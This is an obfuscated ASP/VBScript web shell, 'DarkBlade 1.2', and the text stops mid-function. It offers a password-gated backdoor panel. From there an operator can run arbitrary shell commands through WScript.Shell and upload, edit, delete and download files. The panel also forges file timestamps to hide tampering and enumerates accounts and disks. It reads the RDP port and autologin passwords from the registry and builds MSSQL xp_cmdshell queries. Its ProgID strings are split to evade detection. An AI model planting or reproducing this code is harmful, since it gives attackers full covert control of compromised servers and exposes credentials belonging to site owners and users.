<%@ LANGUAGE='VBScript' CODEPAGE='65001'%>
<%
Response.Buffer=True
Response.Charset="utf-8"
Server.ScriptTimeOut=300
'-------------------------------Config-------------------------------
Const pass="e10adc3949ba59abbe56e057f20f883e"'tencentisapieceofshit
Const needEncode=False
Const encodeNum=63
Const isDebugMode=False
Const encodeCut="."
Const pamtoEncode="pccem|tmw|rkqog|gdxq|okxlt|jte|kwnoj|xrla|simo|wfc|nsp|ojn|vbv|nyfm|mtidt|yrzp|xqx|seux|iih"
Const showLogin="login"
Const defaultChr="GB2312"
Const aspExt="asp|asa|cer|cdx"
Const textExt="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"
Const sqlPageSize=20
Const fToPre="zzzzzzzz.html"
Const bOtherUser=False'
'-------------------------------Config-------------------------------

Dim goaction,pccem,rkqog,gdxq,jte,kwnoj,uszcs,fygv,opnsd,tyz,aeh,psx,tics,xhq,dpr,eszr,ebyut,nycqm,xhbfv,xrla,pqot,bina,ptvn,tmw,gbdi,wrfse,cbdk,gkkk,pheb,mea,gvr,olg,ekek,xelp,conn,simo,funx,lginb,gtttu,yyzk,wfc,nsp,rgop,ojn,vbv,iojk,nyfm,mtidt,yir,eef,rjvjh,tqnx,dzlc,yaj,mt,svl,yrzp,iih,xqx,seux,sru,bwl,wna,kjx,okxlt,adsnp,avyoh,uoe,ttrwh,ycpoe,lcb,nxfic,jxi,qdq,fegof,vvvg,tqmi,plxod
adsnp="Dar"&sevw&"kBlade 1.2 by Blood"&ngo&"Sword"
avyoh="Dar"&sevw&"kBlade"
uoe="DarkB"&cahk&"ladePass"
rnzov()
If yxndg Then zdd()
goaction=request("goaction")
If Not yxndg() And goaction<>showLogin Then jpyyx()
If bOtherUser And Trim(mzbu("AUT"&cdoe&"H_USER"))="" Then
Response.Status="401 Unauthor"&zwf&"ized"
Response.Addheader"WWW-AuT"&ijhmx&"henticate", "BASIC"
If mzbu("AUT"&cdoe&"H_USER")=""Then Response.End()
End If
Select Case goaction
Case showLogin
usyug()
Case"pgvr"
tnrhz()
Case"olgk"
nhwc()
Case"smsap"
dbgr()
Case"wanmc"
rwj()
Case"jaz"
ytv()
Case"drowk"
nolj()
Case"abjw"
iqhtx()
Case"kpnff"
ksf()
Case"qkdm"
rby()
Case"itzvh"
fuo()
Case"Logout"
mqd()
Case"nuwf"
ubi()
Case"cfh","unv"
yce()
Case Else
yce()
End Select
smeb
Sub rnzov()
If Not isDebugMode Then On Error Resume Next
dpr=Timer()
Dim mvtor,smrzp,dech,bjnaz,twn,fyi,snpui
servurl=mzbu("URL")
Set fygv=phthe("MSX"&jqh&"ML2.X"&xnp&"MLHTTP")
Set opnsd=phthe("WScr"&cbsst&"ipt.Sh"&qzwg&"ell")
Set tyz=phthe("Scr"&kpyz&"ipting.FileSystemObje"&jrto&"ct")
Set aeh=phthe("She"&njsg&"ll.A"&gpb&"pplication")
If Not IsObject(opnsd)Then Set opnsd=phthe("WScr"&cbsst&"ipt.She"&njsg&"ll.1")
If Not IsObject(aeh)Then Set aeh=phthe("She"&njsg&"ll.A"&gpb&"pplication.1")
Set psx=new RegExp
psx.Global=True
psx.IgnoreCase=True
psx.MultiLine=True
uszcs=mzbu("SERVER_NAME")
tics=mzbu("PATH_INFO")
xhq=LCase(tqml(tics,"/"))
ebyut=gwbw(".")
nycqm=gwbw("/")
If wrfse<>"pjz"And Right(pccem,1)="\"Then pccem=Left(pccem,Len(pccem)-1)
If Len(pccem)=2 Then pccem=pccem&"\"
gbdi=1
pqot=1
End Sub
Sub zdd()
For Each smrzp In request.queryString
execute""&smrzp&"=request.queryString("""&smrzp&""")"
Next
For Each mvtor In request.Form
execute""&mvtor&"=request.form("""&mvtor&""")"
Next
snpui=Split(pamtoEncode,"|")
For Each fyi In snpui
execute""&fyi&"=wzec("&fyi&")"
Next
End Sub
Sub smeb()
If Not isDebugMode Then On Error Resume Next
Dim ftss
fygv.abort
Set fygv=Nothing
Set opnsd=Nothing
Set tyz=Nothing
Set aeh=Nothing
Set psx=Nothing
eszr=timer()
ftss=eszr-dpr
eps"<br></div>"
gns"100%"
eps"<tr class=""head"">"
eps"<td>"
girbw xhbfv
ftss=FormatNumber(ftss,5)
If Left(ftss,1)="."Then ftss="0"&ftss
girbw"<br>"
eps"<div align=right>Processed in :"&ftss&"seconds</div></td></tr></table></body></html>"
Response.End()
End Sub
Sub usyug()
If Not isDebugMode Then On Error Resume Next
kjx=request("kjx")
If kjx<>""Then
kjx=mmyo(kjx)
If mmyo(kjx)=pass Then
Response.Cookies(uoe)=kjx
Response.Redirect(tics)
Else
sqvg"Fuck you,get out!"
End If
End If
swz"Login"
eps"<center><br>"
sdy False
eps"<b>Password : </b>"
sztyg"password","kjx","","30",""
eps" "
uivh"Get In"
eps"</center></form>"
End Sub
Sub ytv()
If Not isDebugMode Then On Error Resume Next
Dim i,cprl,ewww,fxhdn,eamdr,tcauy,gng,uzu,tyjq,opoe
fxhdn="SystemR"&ysxgv&"oot|Win"&cbejt&"Dir|ComS"&kjols&"pec|TEMP|TMP|NUMBER_OF_PROCESSORS|OS|Os2L"&jqxo&"ibPath|Path|PAT"&qpf&"HEXT|PROCESSOR_ARCHITECTURE|"&_
"PROCESSOR_IDENTIFIER|PROCESSOR_LEVEL|PROCESSOR_REVISION"
ewww=Split(fxhdn,"|")
Execute "Set cprl=opnsd.E"&ijr&"nvironment(""SYSTEM"")"
eamdr=mzbu("NUMBER_OF_PROCESSORS")
If IsNull(eamdr)Or eamdr=""Then
eamdr=cprl("NUMBER_OF_PROCESSORS")
End If
gng=mzbu("OS")
If IsNull(gng)Or gng=""Then
gng=cprl("OS")
gng=gng&"(Probablely Windows 2003)"
End If
tcauy=cprl("PROCESSOR_IDENTIFIER")
swz"Server Infomation"
gns"100%"
las 1
eps"<td colspan=""2""align=""center"">"
eps"<b>Server parameters:</b>"
eps"</td>"
byu
las 0
kgsj"Server name:","20%"
kgsj uszcs,"80%"
byu
las 1
kgsj"Server IP:",""
kgsj mzbu("LOCAL_ADDR"),""
byu
las 0
kgsj"Server port:",""
kgsj mzbu("SERVER_PORT"),""
byu
las 1
kgsj"Server Mem"&mvg&"ory",""
Execute "kgsj crl(aeh.GetSys"&fcw&"temInformation(""PhysicalMemoryInstalled"")),"""""
byu
las 0
kgsj"Server time",""
kgsj Now,""
byu
las 1
kgsj"Server soft",""
kgsj mzbu("SERVER_SOFTWARE"),""
byu
las 0
kgsj"Script timeout",""
kgsj Server.ScriptTimeout,""
byu
las 1
kgsj"Number of cpus",""
kgsj eamdr,""
byu
las 0
kgsj"Info of cpus",""
kgsj tcauy,""
byu
las 1
kgsj"Server OS",""
kgsj gng,""
byu
las 0
kgsj"Server script engine",""
kgsj ScriptEngine&"/"&ScriptEngineMajorVersion&"."&ScriptEngineMinorVersion&"."&ScriptEngineBuildVersion,""
byu
las 1
kgsj"File full path",""
kgsj mzbu("PATH_TRANSLATED"),""
byu
pqot=0
For i=0 To UBound(ewww)
las pqot
kgsj ewww(i)&":",""
Execute "kgsj opnsd.Ex"&jom&"pandEnvironmentStrings(""%""&ewww(i)&""%""),"""""
byu
nhlnt
Next
vlpr
afqj(Err)
eps"<br>"
Set cprl=Nothing
Dim pgf
gns"100%"
las 1
eps"<td colspan=""6""align=""center"">"
eps"<b>Info of disks</b>"
eps"</td>"
byu
las 0
kgsj"Driver letter","16%"
kgsj"Type","16%"
kgsj"Label","16%"
kgsj"File system","20%"
kgsj"Room left","16%"
kgsj"Total space","16%"
byu
pqot=1
For Each pgf In tyz.Drives
Dim nlt,siznx,dqsl,eyq,oyjpl,nokl
nlt=pgf.DriveLetter
If LCase(nlt)<>"a"Then
siznx=xlve(pgf.DriveType)
dqsl=pgf.VolumeName
eyq=pgf.Filesystem
oyjpl=crl(pgf.FreeSpace)
Execute "nokl=crl(pgf.TotalSiz"&kpz&"e)"
las pqot
kgsj nlt,""
kgsj siznx,""
kgsj dqsl,""
kgsj eyq,""
kgsj oyjpl,""
kgsj nokl,""
byu
End If
nlt=""
siznx=""
dqsl=""
eyq=""
oyjpl=""
nokl=""
nhlnt
Next
vlpr
afqj(Err)
Set pgf=Nothing
Dim szds
Set szds=tyz.GetFolder(nycqm)
eps"<br>"
gns"100%"
las 1
eps"<td colspan=""2""align=""center"">"
eps"<b>Info of site:</b>"
eps"</td>"
byu
las 0
doTd"Real path:","20%"
doTd nycqm,"80%"
byu
las 1
doTd"Current size:",""
doTd crl(szds.Size),""
byu
las 0
doTd"File count:",""
doTd szds.Files.Count,""
byu
las 1
doTd"Folder count:",""
doTd szds.SubFolders.Count,""
byu
las 0
doTd"Create date:",""
Execute "doTd szds.D"&inyrz&"ateCreated,"""""
byu
las 1
doTd"Last visited:",""
doTd szds.DateLastAccessed,""
byu
vlpr
afqj(Err)
girbw"<br>"
Dim xrzo,xej,jilq
Dim wkfv,qaji,ijgs,ofrv
uzu="HKEY_LOCAL_MACHINE\SYSTEM\Current"&fzhwc&"ControlSet\Control\Termi"&oca&"nal Server\WinS"&dtwzr&"tations\RDP"&yidsn&"-Tcp\"
tyjq="PortNumber"
Execute "opoe=opnsd.RegRe"&juogq&"ad(uzu&tyjq)"
If opoe=""Then opoe="Can't get Termi"&oca&"nal port.<br/>"
xrzo="HK"&qzloh&"LM\SOFT"&yitz&"WARE\Microsoft\Win"&mwfes&"dows NT\CurrentVers"&xyu&"ion\Winlog"&cjn&"on\"
qaji="AutoAdmi"&coc&"nLogon"
xej="DefaultUse"&dxp&"rName"
jilq="Defa"&fdjfr&"ultPassword"
Execute "wkfv=opnsd.RegRea"&aij&"d(xrzo&qaji)"
If wkfv=0 Then
ijgs="Autologin isn't enabled"
Else
Execute "ijgs=opnsd.Re"&vwuz&"gRead(xrzo&xej)"
End If
If wkfv=0 Then
ofrv="Autologin isn't enabled"
Else
Execute "ofrv=opnsd.RegR"&yppp&"ead(xrzo&jilq)"
End If
gns"100%"
las 1
eps"<td colspan=""2""align=""center"">"
eps"<b>Info about Termi"&oca&"nal port&Autologin</b>"
eps"</td>"
byu
las 0
doTd"Termi"&oca&"nal port:","20%"
doTd opoe,"80%"
byu
las 1
doTd"Autologin account:","20%"
doTd ijgs,"80%"
byu
las 0
doTd"Autologin password:","20%"
doTd ofrv,"80%"
byu
vlpr
eps"</ol>"
afqj(Err)
End Sub
Sub tnrhz()
Dim i,nlrn,crmo,ibwlr
crmo="MSW"&tnfc&"C.AdRotator,MSW"&tnfc&"C.Bro"&fxtf&"wserType,MSW"&tnfc&"C.NextLink,MSW"&tnfc&"C.TOOLS,MSW"&tnfc&"C.Status,MSW"&tnfc&"C.Counters,IISS"&oytg&"ample.Conten"&gudbw&"tRotator,IISS"&oytg&"ample.PageC"&mdpt&"ounter,MSW"&tnfc&"C.PermissionChec"&fzro&"ker,Ad"&lvs&"odb.Connect"&tzf&"ion,Sof"&jomu&"tArtisans.F"&tkyi&"ileUp,Sof"&jomu&"tArtisans.File"&iijs&"Manager,LyfUpload.UploadFile,Pe"&afdv&"rsits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Pe"&afdv&"rsits.MailSender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer,IISmail.Iismail.1,SmtpMail.SmtpMail.1,Sof"&jomu&"tArtisans.ImageGen,W3Image.Image,Scr"&kpyz&"ipting.FileSystemObje"&jrto&"ct,Ad"&lvs&"odb.S"&lwn&"tream,She"&njsg&"ll.A"&gpb&"pplication,She"&njsg&"ll.A"&gpb&"pplication.1,WScr"&cbsst&"ipt.Sh"&qzwg&"ell,WScr"&cbsst&"ipt.She"&njsg&"ll.1,WScr"&cbsst&"ipt.Network"
ibwlr="Ad Rotator,Browser info,NextLink,,,Counters,Content rotator,,Permission checker,ADODB connection,SA-FileUp,SoftArtisans FileManager,LyfUpload,ASPUpload,Dimac upload,Dimac JMail,CDONTS SMTP mail,ASPemail,ASPmail,dkQmail,Geocel mail,IISmail,SmtpMail,SoftArtisans ImageGen,Dimac W3Image,FSO,Stream ,,,,,"
aryObjectList=Split(crmo,",")
aryDscList=Split(ibwlr,",")
swz"Server Object Probe"
eps"Check for other ProgId or ClassId.<br>"
sdy True
sztyg"text","xrla",xrla,50,""
eps" "
uivh"Check"
ylm
If xrla<>""Then
fsuo
Call zgnr(xrla,"")
eps"</ul>"
End If
eps"<hr/>"
eps"<ul class=""info""><li><u>Object name</u>Status and more</li>"
For i=0 To UBound(aryDscList)
Call zgnr(aryObjectList(i),aryDscList(i))
Next
eps"</ul><hr/>"
End Sub
Sub nhwc()
Dim edi,mtxkk,dgy
swz"Users and Groups Imformation"
Set dgy=getObj("WinNT://.")
dgy.Filter=Array("User")
picvp"User",False
gns"100%"
For Each edi in dgy
las 1
eps"<td colSpan=""2""align=""center""><b>"&edi.Name&"</b></td>"
byu
dtx(edi.Name)
Next
vlpr
eps"</span><br>"
afqj(Err)
picvp"UserGroup",False
dgy.Filter=Array("Group")
gns"100%"
pqot=1
For Each mtxkk in dgy
las pqot
doTd mtxkk.Name,"%20"
doTd mtxkk.Description,"%80"
byu
nhlnt
Next
vlpr
eps"</span>"
afqj(Err)
End Sub
Sub dbgr()
If Not isDebugMode Then On Error Resume Next
Dim ewgor,osgrl,mzaw,nvm
If bina<>""Then session(bina)=ptvn
swz"Server-Client Information"
picvp"ServerVariables",True
gns"100%"
pqot=1
For Each mzaw In Request.ServerVariables
las pqot
doTd mzaw,"20%"
kgsj mzbu(mzaw),"80%"
byu
nhlnt
Next
vlpr
girbw"</span><br>"
picvp"Application",True
gns"100%"
pqot=1
For Each mzaw In Application.Contents
las pqot
doTd mzaw,"20%"
kgsj HtmlEncode(Application(mzaw)),"80%"
byu
nhlnt
Next
vlpr
girbw"</span><br>"
picvp"Session",True
eps"<br>(ID"&Session.SessionId&")"
gns"100%"
pqot=1
For Each mzaw In Session.Contents
nvm=Session(mzaw)
las pqot
doTd mzaw,"20%"
kgsj HtmlEncode(nvm),"80%"
byu
nhlnt
Next
las pqot
sdy False
zbja"Set Session","20%"
eps"<td width=""80%""> Key :"
sztyg"text","bina","",30,""
eps"Value :"
sztyg"text","ptvn","",30,""
eps"</td>"
ylm
byu
vlpr
girbw"</span><br>"
picvp"Cookies",True
gns"100%"
pqot=1
For Each mzaw In Request.Cookies
If Request.Cookies(mzaw).HasKeys Then
For Each ewgor In Request.Cookies(mzaw)
las pqot
doTd mzaw&"("&ewgor&")","20%"
kgsj HtmlEncode(Request.Cookies(mzaw)(ewgor)),"80%"
byu
nhlnt
Next
Else
las pqot
doTd mzaw,"20%"
kgsj HtmlEncode(Request.Cookies(mzaw)),"80%"
byu
nhlnt
End If
Next
vlpr
eps"</span>"
afqj(Err)
End Sub
Sub rwj()
Dim ccdo,axuq
If Not isDebugMode Then On Error Resume Next
swz("WScr"&cbsst&"ipt.Sh"&qzwg&"ell Execute")
If tmw<>""Then
If InStr(LCase(tmw),"cmd.exe")>0 And InStr(rkqog,"/c ")<1 Then
axuq=tmw&" /c "&rkqog
Else
axuq=tmw&" "&rkqog
End If
If fegof=1 Then
Execute "ccdo=opnsd.Exe"&yni&"c(axuq).StdOut.Read"&vepvr&"All()"
Else
Execute "opnsd.R"&acwbz&"un axuq,0,False"
End If
afqj(Err)
Else
tmw="cmd.exe"
End If
gns"100%"
sdy True
las 1
doTd"Path","20%"
sze"text","tmw",tmw,"60%","",""
eps"<td>"
sztyg"checkbox","fegof",1,"","checked"
eps" View result "
uivh"Run"
eps"</td>"
byu
las 0
doTd"Parameters",""
sze"text","rkqog",rkqog,"","","2"
byu
ylm
vlpr
eps"<hr><b>Result:</b><br><span class=""alt1Span"">"&HtmlEncode(ccdo)&"</span>"
afqj(Err)
End Sub
Sub yce()
If Not isDebugMode Then On Error Resume Next
If pccem=""Then pccem=kwnoj
If pccem=""Then pccem=ebyut
If goaction<>"cfh"Then goaction="unv"
If wrfse="down"Then
exfu()
Response.End()
End If
If goaction="unv"Then
mea="fso"
swz("FSO File Explorer")
Else
mea="sa"
swz("APP File Explorer")
End If
Select Case wrfse
Case"qlmkp","zgxy"
fqws()
pccem=zznke(pccem,"\",False)
Case"ndgx"
ndgx()
Case"save","pus"
gccb()
pccem=zznke(pccem,"\",False)
Case"pjz"
zzy()
pccem=zznke(pccem,"\",False)
Case"kdl","eoxxk"
kdl()
Case"qylng","kco"
xpz()
pccem=zznke(pccem,"\",False)
Case"rlebx","syu","xxtu","kru"
maijt()
pccem=zznke(pccem,"\",False)
Case"qxq"
vyc()
Case"ntop"
avj()
pccem=zznke(pccem,"\",False)
End Select
If Len(pccem)<3 Then pccem=pccem&"\"
yogqy()
End Sub
Sub yogqy()
Dim theFolder,yugx,xac,zxczg,sfeuy,srg,ahk,fsrst
If Not isDebugMode Then On Error Resume Next
If mea="fso"Then
Set theFolder=tyz.GetFolder(pccem)
zxczg=tyz.GetParentFolderName(pccem)
Else
Execute "Set theFolder=aeh.NameSpac"&vmbxk&"e(pccem)"
kbc Err
zxczg=zznke(pccem,"\",False)
If InStr(zxczg,"\")<1 Then
zxczg=zxczg&"\"
End If
End If
fsrst=pccem
If Right(fsrst,1)<>"\"Then fsrst=fsrst&"\"
bkljo"fsrst",fsrst
sdy True
eps"Current Path :"
sztyg"text","pccem",pccem,120,""
girbw""
skuq"","170px","onchange=""javascript:if(this.value!=''){uivh('"&goaction&"','',this.value);}"""
emn"","Drivers/Comm folders"
emn HtmlEncode(gwbw(".")),"."
emn HtmlEncode(gwbw("/")),"/"
emn"","----------------"
If LCase(mea)="fso"Then
For Each drive In tyz.Drives
Execute "emn drive.DriveLe"&vcfvc&"tter&"":\"",drive.DriveLe"&vcfvc&"tter&"":\"""
Next
emn"","----------------"
End If
emn"C:\Program Files","C:\Program Files"
emn"C:\Program Files\RhinoSoft.com","RhinoSoft.com"
emn"C:\Program Files\Serv"&dwtpl&"-U","Serv"&dwtpl&"-U"
emn"C:\Program Files\Rad"&lmk&"min","Rad"&lmk&"min"
emn"C:\Program Files\Microsoft SQL Server","Mssql"
emn"C:\Program Files\Mysql","Mysql"
emn"","----------------"
emn"C:\Documents and Settings\All Users","All Users"
emn"C:\Documents and Settings\All Users\Documents","Documents"
emn"C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere","PcAnywhere"
emn"C:\Documents and Settings\All Users\Start Menu\Programs","Start Menu->Programs"
emn"","----------------"
emn"D:\Program Files","D:\Program Files"
emn"D:\Serv"&dwtpl&"-U","D:\Serv"&dwtpl&"-U"
emn"D:\Rad"&lmk&"min","D:\Rad"&lmk&"min"
emn"D:\Mysql","D:\Mysql"
lrnz
uivh"Go"
ylm
girbw"<br><form method=""post"" id=""upform""action="""&tics&"""enctype=""multipart/form-data"">"
sztyg"file","file","","",""
eps"Save As : "
sztyg"text","pccem",pccem,40,""
sztyg"checkbox","pheb",1,"",""
eps" OverWrite "
sztyg"button","","Upload","","onclick=""javascript:uivh('"&goaction&"','pjz','')"""
ylm
If mea="fso"Then
sdy True
sztyg"text","olg","",20,""
bkljo"pccem",pccem
bkljo"wrfse","ndgx"
sztyg"radio","ekek","file","","checked"
eps"File"
sztyg"radio","ekek","folder","",""
eps"Folder"
uivh"New one"
ylm
End If
eps"<hr>"
If mea="fso"Then
If Not tyz.FolderExists(pccem)Then
sqvg pccem&" Folder dosen't exists or access denied!"
smeb
End If
End If
picvp"Folders",False
gns"100%"
las 1
doTd"<b>Folder name</b>","20%"
doTd"<b>Size</b>","20%"
doTd"<b>Last modified</b>","20%"
doTd"<b>Action</b>","40%"
byu
las 0
girbw"<td colspan=""4""><a href=""javascript:uivh('"&goaction&"','','"&rdeb(zxczg)&"')"">Parent Directory</a></td>"
byu
pqot=1
If mea="fso"Then
For Each objX In theFolder.SubFolders
ahk=objX.DateLastModified
las pqot
doTd"<a href=""javascript:uivh('"&goaction&"','','"&objX.Name&"');"">"&objX.Name&"</a>",""
kgsj htmlEncode("<dir>"),""
kgsj ahk,""
eps"<td>"
girbw"<a href=""javascript:uivh('"&goaction&"','xxtu','"&objX.Name&"')"">Copy</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','kru','"&objX.Name&"')"">Move</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','kco','"&objX.Name&"')"">Rename</a> -"
girbw"<a href=""javascript:uivh('nuwf','zkaeh','"&objX.Name&"')"">Package</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','zgxy','"&objX.Name&"')"">Delete</a>"
girbw"</td>"
byu
nhlnt
Next
Else
For Each objX In theFolder.Items
If objX.IsFolder Then
ahk=theFolder.GetDetailsOf(objX,3)
las pqot
doTd"<a href=""javascript:uivh('"&goaction&"','','"&objX.Name&"');"">"&objX.Name&"</a>",""
kgsj htmlEncode("<dir>"),""
kgsj ahk,""
eps"<td>"
girbw"<a href=""javascript:uivh('"&goaction&"','kco','"&objX.Name&"')"">Rename</a> -"
girbw"<a href=""javascript:uivh('nuwf','xafp','"&objX.Name&"')"">Package</a>"
girbw"</td>"
byu
nhlnt
End If
Next
End If
vlpr
girbw"</span><br>"
picvp"Files",False
gns"100%"
eps"<b>"
las 1
doTd"<b>File name</b>","20%"
doTd"<b>Size</b>","20%"
doTd"<b>Last modified</b>","20%"
doTd"<b>Action</b>","40%"
byu
eps"</b>"
pqot=0
If mea="fso"Then
For Each objX In theFolder.Files
sfeuy=crl(objX.Size)
ahk=objX.DateLastModified
If LCase(Left(objX.Path,Len(nycqm)))<>LCase(nycqm) Then
yugx=""
Else
yugx=Replace(Replace(qnku(Mid(objX.Path,Len(nycqm) + 1)),"%2E","."),"+","%20")
End If
las pqot
If yugx=""Then
doTd objX.Name,""
Else
doTd"<a href='"&Replace(yugx,"%5C","/")&"' target=_blank>"&objX.Name&"</a>",""
End If
kgsj sfeuy,""
kgsj ahk,""
eps"<td>"
girbw"<a href=""javascript:uivh('"&goaction&"','kdl','"&objX.Name&"')"">Edit</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','rlebx','"&objX.Name&"')"">Copy</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','syu','"&objX.Name&"')"">Move</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','qylng','"&objX.Name&"')"">Rename</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','down','"&objX.Name&"')"">Down</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','qxq','"&objX.Name&"')"">Attributes</a> -"
girbw"<a href=""javascript:vnkh('fyec','"&objX.Name&"','','','')"">Database</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','qlmkp','"&objX.Name&"')"">Delete</a>"
girbw"</td>"
byu
nhlnt
Next
Else
For Each objX In theFolder.Items
If Not objX.IsFolder Then
Dim gibhf
gibhf=tqml(objX.Path,"\")
srg=rdeb(objX.Path)
sfeuy=theFolder.GetDetailsOf(objX,1)
ahk=theFolder.GetDetailsOf(objX,3)
If LCase(Left(objX.Path,Len(nycqm)))<>LCase(nycqm) Then
yugx=""
Else
yugx=Replace(Replace(qnku(Mid(objX.Path,Len(nycqm)+1)),"%2E","."),"+","%20")
End If
las pqot
If yugx=""Then
doTd tqml(objX.Path,"\"),""
Else
doTd"<a href='"&Replace(yugx,"%5C","/")&"' target=_blank>"& tqml(objX.Path,"\")&"</a>",""
End If
kgsj sfeuy,""
kgsj ahk,""
eps"<td>"
girbw"<a href=""javascript:uivh('"&goaction&"','kdl','"&gibhf&"')"">Edit</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','qylng','"&gibhf&"')"">Rename</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','down','"&gibhf&"')"">Down</a> -"
girbw"<a href=""javascript:uivh('"&goaction&"','qxq','"&gibhf&"')"">Attributes</a> -"
girbw"<a href=""javascript:vnkh('fyec','"&gibhf&"','','','')"">Database</a>"
girbw"</td>"
byu
nhlnt
End If
Next
End If
vlpr
eps"</span>"
afqj(Err)
End Sub
Sub vyc()
Dim wxic,ieozf,mds,bli,xzgmf,dieec,szg,ppfvx
If Not isDebugMode Then On Error Resume Next
If IsObject(tyz)Then
Set wxic=tyz.GetFile(pccem)
End If
If IsObject(aeh)Then
szg=zznke(pccem,"\",False)
mds=tqml(pccem,"\")
Execute "Set dieec=aeh.NameSpa"&mqry&"ce(szg)"
Set ieozf=dieec.ParseName(mds)
End If
eps"<center>"
gns"60%"
sdy True
bkljo"wrfse","ntop"
bkljo"pccem",pccem
las 1
zbja"Set attribute","40%"
doTd pccem,"60%"
byu
las 0
doTd"Attributes",""
If IsObject(tyz)Then
xzgmf=wxic.Attributes
bli="<input type=checkbox name=plxod value=4 class='input' {$system}>system "
bli=bli&"<input type=checkbox name=plxod value=2 class='input' {$hidden}>hide "
bli=bli&"<input type=checkbox name=plxod value=1 class='input' {$readonly}>readonly "
bli=bli&"<input type=checkbox name=plxod value=32 class='input' {$archive}>save "
If xzgmf>=128 Then xzgmf=xzgmf-128
If xzgmf>=64 Then xzgmf=xzgmf-64
If xzgmf>=32 Then
xzgmf=xzgmf-32
bli=Replace(bli, "{$archive}", "checked")
End If
If xzgmf>=16 Then xzgmf=xzgmf-16
If xzgmf>=8 Then xzgmf=xzgmf-8
If xzgmf>=4 Then
xzgmf=xzgmf-4
bli=Replace(bli, "{$system}", "checked")
End If
If xzgmf>=2 Then
xzgmf=xzgmf-2
bli=Replace(bli, "{$hidden}", "checked")
End If
If xzgmf>=1 Then
xzgmf=xzgmf-1
bli=Replace(bli, "{$readonly}", "checked")
End If
doTd bli,""
Else
doTd"FSO object disabled,can't get/set attributes -_-~!",""
End If
byu
If IsObject(aeh)Then
las 1
doTd"Date created",""
doTd dieec.GetDetailsOf(ieozf,4),""
byu
las 0
doTd"Date last modified",""
sze"text","vvvg",dieec.GetDetailsOf(ieozf,3),"","",""
byu
las 1
doTd"Date last accessed",""
doTd dieec.GetDetailsOf(ieozf,5),""
byu
Else
las 1
doTd"Date created",""
Execute "doTd wxic.DateCr"&pfjm&"eated,"""""
byu
las 0
doTd"Date last modified",""
doTd wxic.DateLastModified,""
byu
las 1
doTd"Date last accessed",""
doTd wxic.DateLastAccessed,""
byu
End If
ylm
sdy True
bkljo"wrfse","ntop"
bkljo"pccem",pccem
las 0
If IsObject(aeh)Then
zbja"Clone time ",""
eps"<td>"
skuq"tqmi","100%",""
For Each objX In dieec.Items
If Not objX.IsFolder Then
ppfvx=tqml(objX.Path,"\")
emn ppfvx,dieec.GetDetailsOf(dieec.ParseName(ppfvx),3)&" --- "&ppfvx
End If
Next
Else
eps"<td colspan=2>App object disabled,can't modify time -_-~!</td>"
End If
vlpr
ylm
smeb()
End Sub
Sub avj()
If Not isDebugMode Then On Error Resume Next
Dim orw,wxic,szg,mds,dieec,ieozf
If IsObject(tyz)Then
Set wxic=tyz.GetFile(pccem)
End If
If IsObject(aeh)Then
szg=zznke(pccem,"\",False)
mds=tqml(pccem,"\")
Execute "Set dieec=aeh.NameSpa"&mqry&"ce(szg)"
Set ieozf=dieec.ParseName(mds)
End If
'eps plxod
If plxod<>""Then
plxod=Split(Replace(plxod," ",""),",")
eps"fuck"
For i=0 To UBound(plxod)
orw=orw+CInt(plxod(i))
Next
wxic.Attributes=orw
If Err Then
afqj(Err)
Else
sqvg"Attributes modified"
End If
End If
If vvvg<>"" And IsDate(vvvg)Then
ieozf.ModifyDate=vvvg
If Err Then
afqj(Err)
Else
sqvg"Time modified"
End If
End If
If tqmi<>""Then
ieozf.ModifyDate=dieec.GetDetailsOf(dieec.ParseName(tqmi),3)
If Err Then
afqj(Err)
Else
sqvg"Time modified"
End If
End If
End Sub
Sub nolj()
If Not isDebugMode Then On Error Resume Next
Dim rs
If okxlt=""And simo<>""And wrfse="itmu"Then okxlt="select * from ["&simo&"]"
If gdxq=""Then gdxq=session(avyoh&"gdxq")
tkwaa()
If gdxq<>""Then
Select Case wrfse
Case"itmu"
itmu()
Case Else
fyec()
End Select
End If
kbqxz
smeb
End Sub
Sub tkwaa()
If Not isDebugMode Then On Error Resume Next
swz("Microsoft Database")
sdy True
girbw"Connect String : "
sztyg"text","gdxq",gdxq,160,""
eps" "
uivh"OK"
ylm
picvp"GetConnectString",True
gns"100%"
las 1
doTd"SqlOleDb","10%"
girbw"<td style=""width:80%"">Server:"
sztyg"text","MsServer","127.0.0.1","15",""
eps" Username:"
sztyg"text","MsUser","sa","10",""
eps" Password:"
sztyg"text","MsPass","","10",""
eps" DataBase:"
sztyg"text","DBPath","","10",""
eps"</td>"
sze"button","","Generate","10%","onClick=""javascript:btpb(MsServer.value,MsUser.value,MsPass.value,DBPath.value)""",""
byu
las 0
doTd"Jet",""
girbw"<td>DB path:"
sztyg"text","accdbpath",ebyut&"\","82",""
eps"</td>"
sze"button","","Generate","10%","onClick=""javascript:acidi(accdbpath.value)""",""
byu
vlpr
eps"</span><hr>"
If Err Then Err.clear
If gdxq<>""Then
fcmwc gdxq
session(avyoh&"gdxq")=gdxq
Set rs=phthe("Ad"&lvs&"odb.Record"&msnom&"Set")
rs.Open "select * from sysobjects",conn,1,1
If Err Then
xelp="access"
Err.clear
Else
xelp="mssql"
%>
<script language=vbscript>
Function mgyv(ned)
form2.okxlt.value="exec mas"&vci&"ter..xp_cmdshell '"&ned&"'"
End Function
Function rqie(lvdfa,znxs,dlc)
form2.okxlt.value="exec mas"&vci&"ter..xp_regread '"&lvdfa&"','"&znxs&"','"&dlc&"'"
End Function
Function omh(jjju)
form2.okxlt.value="exec mas"&vci&"ter..xp_dirtree '"&jjju&"',1,1"
End Function
Function rxrxf(gdawv,bmds,blidh,pjoxm,ffejg)
If ffejg=2 Then
